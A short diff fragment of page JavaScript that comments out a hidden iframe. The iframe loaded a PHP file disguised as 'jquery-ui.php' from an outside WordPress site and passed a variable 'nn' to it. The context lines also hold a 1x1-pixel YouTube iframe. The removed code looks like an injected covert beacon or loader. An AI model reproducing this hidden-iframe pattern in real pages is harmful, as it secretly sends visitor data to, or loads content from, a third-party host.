@@ -29,5 +29,5 @@ $("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embe
 //else {
    //window.location = "";
 //// }
- $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-  .appendTo('#overlays');
+ //$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
+ // .appendTo('#overlays');
